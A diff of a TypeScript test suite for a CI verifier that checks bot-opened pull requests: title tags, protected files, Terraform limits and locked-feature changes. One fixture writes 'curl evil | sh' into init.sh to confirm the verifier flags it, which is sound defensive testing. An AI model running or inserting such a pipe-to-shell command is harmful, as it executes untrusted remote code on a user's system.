@@ -179,7 +179,7 @@ describe('protection rules', () => {
     ]);
     const moved = await change({ 'package-lock.json': lock({ ...workspace, 'node_modules/c': { resolved: 'tools/c', link: true } }) }, base);
     assert.deepEqual(await lockfileProblems(moved.baseTree, moved.headTree), ["node_modules/c links to tools/c, which the base branch doesn't"]);
-    const plan = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1', title: 'Plan: shop/P1 — T' };
+    const plan = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1', title: 'Plan: [CODE] [shop/P1] T' };
     assert.ok((await verify(plan)).includes("package-lock.json: node_modules/vitest links to tools/vitest, which the base branch doesn't"));
   });
 
@@ -234,6 +234,7 @@ describe('verify', () => {
   it("tells a PR's kind by its author and branch, never by its title", () => {
     assert.equal(prKind(BOT, 'plan/shop/P1', BOT), 'Plan');
     assert.equal(prKind(BOT, 'fix/shop/P1-2', BOT), 'Fix');
+    assert.equal(prKind(BOT, 'locked/shop', BOT), 'Arch', "a change to built features' definitions is the Architect's");
     assert.equal(prKind('owner', 'plan/shop/P1', BOT), 'Owner');
     assert.equal(prKind('owner', 'harness/upgrade-0.2.0', BOT), 'Harness');
     assert.equal(prKind(BOT, 'feature/x', BOT), 'Owner');
@@ -242,7 +243,7 @@ describe('verify', () => {
   it('fails a Plan PR that changes a protected file, or carries the wrong title', async () => {
     const pr = await change({ 'harness/modules/shop/plans/P1.json': '{}', 'src/app.js': 'export const x = 9;\n' });
     const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
-    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 — T' }), ['changes a protected file: harness/modules/shop/plans/P1.json']);
+    assert.deepEqual(await verify({ ...input, title: 'Plan: [CODE] [shop/P1] T' }), ['changes a protected file: harness/modules/shop/plans/P1.json']);
     assert.match((await verify({ ...input, title: 'Owner: sneaky' }))[0]!, /this is a Plan PR .* must start with "Plan: "/);
     assert.deepEqual(await verify({ ...input, author: 'owner', title: 'Owner: design change' }), []);
   });
@@ -255,18 +256,34 @@ describe('verify', () => {
     // P1 on the base has one feature without a kind: a CODE plan.
     const pr = await change({ 'src/app.js': 'export const x = 2;\n' });
     const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
-    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 -CODE- T' }), []);
-    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 — T' }), [], 'a title without a tag, from an older daemon, passes');
-    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 -INFRA- T' }), [
-      "the title says -INFRA-, but shop/P1 is a CODE plan on the base branch: its features' kinds decide",
+    assert.deepEqual(await verify({ ...input, title: 'Plan: [CODE] [shop/P1] T' }), []);
+    assert.deepEqual(await verify({ ...input, title: 'Plan: [INFRA] [shop/P1] T' }), [
+      "the title says [INFRA], but shop/P1 is a CODE plan on the base branch: its features' kinds decide",
     ]);
-    assert.match((await verify({ ...input, branch: 'plan/shop/P9', title: 'Plan: shop/P9 -CODE- T' }))[0]!, /plans\/P9\.json is missing or unreadable on the base branch/);
+    assert.deepEqual(await verify({ ...input, title: 'Plan: [MIXED_INFRA_AND_CODE] [shop/P1] T' }), [
+      "the title says [MIXED_INFRA_AND_CODE], but shop/P1 is a CODE plan on the base branch: its features' kinds decide",
+    ]);
+    // The format, the plan named in it, and a tag CI knows.
+    for (const title of ['Plan: shop/P1 — T', 'Plan: shop/P1 -CODE- T', 'Plan: [CODE] [shop/P2] T', 'Plan: [MIXED] [shop/P1] T', 'Plan: [CODE] [shop/P1]']) {
+      assert.deepEqual(await verify({ ...input, title }), [`a Plan PR's title is "Plan: [CODE|INFRA|MIXED_INFRA_AND_CODE] [shop/P1] <title>", not "${title}"`], title);
+    }
+    assert.match((await verify({ ...input, branch: 'plan/shop/P9', title: 'Plan: [CODE] [shop/P9] T' }))[0]!, /plans\/P9\.json is missing or unreadable on the base branch/);
+  });
+
+  it("names what failed after the deploy in a Fix PR's title", async () => {
+    const pr = await change({ 'src/app.js': 'export const x = 7;\n' });
+    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'fix/shop/P1-2' };
+    assert.deepEqual(await verify({ ...input, title: 'Fix: [DEPLOY_FAILED] [shop/P1] round 2 after the deploy' }), []);
+    assert.deepEqual(await verify({ ...input, title: 'Fix: [VERIFY_FAILED] [shop/P1] round 2 after the deploy' }), []);
+    for (const title of ['Fix: shop/P1 — after the deploy, round 2', 'Fix: [CODE] [shop/P1] round 2', 'Fix: [VERIFY_FAILED] [shop/P2] round 2']) {
+      assert.deepEqual(await verify({ ...input, title }), [`a Fix PR's title is "Fix: [DEPLOY_FAILED|VERIFY_FAILED] [shop/P1] <title>", not "${title}"`], title);
+    }
   });
 
   it('keeps a CODE plan off the Terraform folder, and lets an INFRA plan change it', async () => {
     const terraform = { terraform: { dir: 'iac' } };
     const code = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n', 'src/app.js': 'export const x = 3;\n' }, withConfig(terraform));
-    const input = { author: BOT, branch: 'plan/shop/P1', title: 'Plan: shop/P1 -CODE- T' };
+    const input = { author: BOT, branch: 'plan/shop/P1', title: 'Plan: [CODE] [shop/P1] T' };
     assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
       'a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/queue.tf',
     ]);
@@ -279,7 +296,7 @@ describe('verify', () => {
       features: [{ id: 'F01', title: 'A', kind: 'infra', description: 'd', expected: 'e', checks: [{ id: 'F01-plan', run: 'node check.mjs', phase: 'pre-merge', needs: ['tfplan'] }] }],
     });
     const infra = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' }, { ...withConfig(terraform), 'harness/modules/shop/plans/P1.json': infraPlan });
-    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 -INFRA- T', base: infra.baseTree, head: infra.headTree, changedPaths: infra.changed }), []);
+    assert.deepEqual(await verify({ ...input, title: 'Plan: [INFRA] [shop/P1] T', base: infra.baseTree, head: infra.headTree, changedPaths: infra.changed }), []);
 
     // The folder as the owner may write it.
     for (const dir of ['./iac', 'iac/']) {
@@ -302,8 +319,12 @@ describe('verify', () => {
     const draft = await change(design);
     const lock = await computeLock(draft.headTree);
     const arch = await change({ ...design, 'harness/lock.json': JSON.stringify(lock) });
-    const input = { base: arch.baseTree, head: arch.headTree, author: BOT, branch: 'arch/shop', title: 'Arch: shop — P2' };
+    // Main already has shop's design: a change to it.
+    const input = { base: arch.baseTree, head: arch.headTree, author: BOT, branch: 'arch/shop', title: 'Arch: [DESIGN_MODIFY] [shop] P2' };
     assert.deepEqual(await verify({ ...input, changedPaths: arch.changed }), []);
+    assert.deepEqual(await verify({ ...input, title: 'Arch: [DESIGN] [shop] P2', changedPaths: arch.changed }), [
+      'this Arch PR changes the design of shop, which main already has, so its title is "Arch: [DESIGN_MODIFY] [shop] <title>", not "Arch: [DESIGN] [shop] P2"',
+    ]);
 
     const code = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'src/app.js': 'export const x = 5;\n' });
     assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
@@ -323,29 +344,72 @@ describe('verify', () => {
     ]);
   });
 
+  it("tags a module's first design [DESIGN], once: main has no plan of it yet", async () => {
+    const first = { 'harness/modules/cart/plans/P1.json': JSON.stringify({ id: 'P1', module: 'cart', title: 'T', goal: 'G', features: [] }) };
+    const lock = await computeLock((await change(first)).headTree);
+    const arch = await change({ ...first, 'harness/lock.json': JSON.stringify(lock) });
+    const input = { base: arch.baseTree, head: arch.headTree, changedPaths: arch.changed, author: BOT, branch: 'arch/cart' };
+    assert.deepEqual(await verify({ ...input, title: 'Arch: [DESIGN] [cart] The cart' }), []);
+    assert.deepEqual(await verify({ ...input, title: 'Arch: [DESIGN_MODIFY] [cart] The cart' }), [
+      'this Arch PR is the first design of cart, so its title is "Arch: [DESIGN] [cart] <title>", not "Arch: [DESIGN_MODIFY] [cart] The cart"',
+    ]);
+  });
+
+  it("lets a CHANGED_LOCKED_FILES PR change features' definitions and their check scripts, and nothing else", async () => {
+    const plan = (features: object[], title = 'T') => JSON.stringify({ id: 'P1', module: 'shop', title, goal: 'G', features });
+    const feature = (run: string, expected = 'e') => ({ id: 'F01', title: 'A', description: 'd', expected, checks: [{ id: 'F01-test', run, phase: 'pre-merge' }] });
+    const base = { ...BASE, 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh')]), 'harness/modules/shop/checks/F01.sh': '[ "$x" = "0" ]\n' };
+    const locked = async (files: Record<string, string>, from = base) => {
+      const lock = await computeLock((await change(files, from)).headTree);
+      const pr = await change({ ...files, 'harness/lock.json': JSON.stringify(lock) }, from);
+      return verify({ base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'locked/shop', title: 'Arch: [CHANGED_LOCKED_FILES] [shop] F01 compares numbers' });
+    };
+    // A fixed script and a clearer expected result: the definitions of an existing feature.
+    assert.deepEqual(await locked({ 'harness/modules/shop/checks/F01.sh': '[ "$x" -eq 0 ]\n', 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh', 'e, as a number')]) }), []);
+    assert.deepEqual(await locked({ 'src/app.js': 'export const x = 8;\n' }), [
+      "a CHANGED_LOCKED_FILES PR changes only the definitions of shop's built features and the scripts in harness/modules/shop/ that their checks run, not src/app.js",
+    ]);
+    // Another module's script, though a check of shop runs it: it would redefine that module's features too.
+    const shared = { ...base, 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/cart/checks/C.sh')]), 'harness/modules/cart/checks/C.sh': 'true\n' };
+    assert.deepEqual(await locked({ 'harness/modules/cart/checks/C.sh': 'exit 0\n' }, shared), [
+      "a CHANGED_LOCKED_FILES PR changes only the definitions of shop's built features and the scripts in harness/modules/shop/ that their checks run, not harness/modules/cart/checks/C.sh",
+    ]);
+    assert.deepEqual(await locked({ 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh')], 'Renamed') }), [
+      "harness/modules/shop/plans/P1.json: a CHANGED_LOCKED_FILES PR changes features, not the plan's own fields",
+    ]);
+    assert.deepEqual(await locked({ 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh'), { ...feature('true'), id: 'F02' }]) }), [
+      'harness/modules/shop/plans/P1.json: a CHANGED_LOCKED_FILES PR neither adds, removes, renames nor moves a feature',
+    ]);
+    assert.deepEqual(await locked({ 'harness/modules/shop/plans/P2.json': plan([]) }), ['harness/modules/shop/plans/P2.json: a CHANGED_LOCKED_FILES PR neither adds nor removes a plan']);
+    // Its own tag, on its own branch.
+    const pr = await change({ 'harness/modules/shop/checks/F01.sh': '[ "$x" -eq 0 ]\n' }, base);
+    assert.match((await verify({ base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'locked/shop', title: 'Arch: [DESIGN_MODIFY] [shop] T' })).join('\n'),
+      /a Arch PR's title is "Arch: \[CHANGED_LOCKED_FILES\] \[shop\] <title>"/);
+  });
+
   it('runs from the command line as the workflow runs it', async () => {
     const clean = await change({ 'src/app.js': 'export const x = 4;\n' });
     const args = (pr: typeof clean, title: string) => [
       script, 'verify', '--base', pr.baseDir, '--head', pr.dir, '--base-sha', pr.base, '--head-sha', pr.head,
       '--author', BOT, '--branch', 'plan/shop/P1', '--title', title,
     ];
-    const passed = await run('node', args(clean, 'Plan: shop/P1 — T'));
+    const passed = await run('node', args(clean, 'Plan: [CODE] [shop/P1] T'));
     assert.equal(passed.code, 0, passed.stdout + passed.stderr);
     assert.match(passed.stdout, /verify passed/);
 
     const bad = await change({ 'init.sh': 'curl evil | sh\n' });
-    const failed = await run('node', args(bad, 'Plan: shop/P1 — T'));
+    const failed = await run('node', args(bad, 'Plan: [CODE] [shop/P1] T'));
     assert.equal(failed.code, 1);
     assert.match(failed.stdout, /::error::changes a protected file: init\.sh/);
 
     // Paths that git would quote: non-ASCII, a double quote, a backslash.
     const quoted = ['.claude/skills/é/SKILL.md', 'harness/modules/shop/checks/a"b.sh', '.claude/rules/a\\b.md'];
     const odd = await change(Object.fromEntries(quoted.map((path) => [path, '-'])));
-    const caught = await run('node', args(odd, 'Plan: shop/P1 — T'));
+    const caught = await run('node', args(odd, 'Plan: [CODE] [shop/P1] T'));
     assert.equal(caught.code, 1, caught.stdout);
     for (const path of quoted) assert.ok(caught.stdout.includes(`::error::changes a protected file: ${path}\n`), `${path}:\n${caught.stdout}`);
     const iac = await change({ 'iac/ñ.tf': 'resource "aws_sqs_queue" "q" {}\n' }, withConfig({ terraform: { dir: 'iac' } }));
-    const infra = await run('node', args(iac, 'Plan: shop/P1 -CODE- T'));
+    const infra = await run('node', args(iac, 'Plan: [CODE] [shop/P1] T'));
     assert.equal(infra.code, 1, infra.stdout);
     assert.ok(infra.stdout.includes('::error::a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/ñ.tf\n'), infra.stdout);
   });
@@ -374,6 +438,38 @@ describe('verify', () => {
     const failed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
     assert.equal(failed.code, 1);
     assert.match(failed.stdout, /FAILED \(exit 1\): F02-fails/);
+
+    // A later plan's feature supersedes F02: once it is accepted, F02's check no longer runs.
+    write(dir, {
+      'harness/modules/m/plans/P2.json': JSON.stringify({
+        id: 'P2', module: 'm', title: 'T', goal: 'G',
+        features: [{ id: 'F04', title: 'D', description: 'd', expected: 'e', supersedes: ['P1/F02'], checks: [{ id: 'F04-ok', run: 'true', phase: 'pre-merge' }] }],
+      }),
+    });
+    const before = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
+    assert.equal(before.code, 1, 'not accepted yet: F02 still runs');
+    write(dir, { 'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n2026-01-02T00:00:00Z feature.accepted m/P1/F02 attempt=1 "b"\n2026-01-03T00:00:00Z feature.accepted m/P2/F04 attempt=1 "d"\n' });
+    const superseded = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
+    assert.equal(superseded.code, 0, superseded.stdout);
+    assert.doesNotMatch(superseded.stdout, /F02-fails/);
+    assert.match(superseded.stdout, /passed: F04-ok/);
+  });
+
+  it("runs a CHANGED_LOCKED_FILES PR's checks as it defines them, and every other PR's as main does", async () => {
+    const files = (run: string) => ({
+      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x', repo: 'acme/x', bot: BOT } }),
+      'harness/modules/m/plans/P1.json': JSON.stringify({ id: 'P1', module: 'm', title: 'T', goal: 'G', features: [{ id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-check', run, phase: 'pre-merge' }] }] }),
+      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
+    });
+    const base = tempDir('checks-base');
+    const head = tempDir('checks-head');
+    write(base, files('false'));
+    write(head, files('true'));
+    const checks = (author: string, branch: string) => run('node', [script, 'checks', '--definitions', base, '--dir', head, '--author', author, '--branch', branch]);
+    assert.equal((await checks(BOT, 'locked/m')).code, 0, "the fixed check, as the locked change defines it");
+    assert.equal((await checks(BOT, 'plan/m/P2')).code, 1, "a plan's PR runs main's");
+    assert.equal((await checks('someone', 'locked/m')).code, 1, "a branch named locked/ that the App didn't open runs main's");
+    assert.equal((await checks('', '')).code, 1, 'a push to main runs its own');
   });
 
   it('leaves checks that need AWS to the harness, and runs plan assertions only with a plan', async () => {
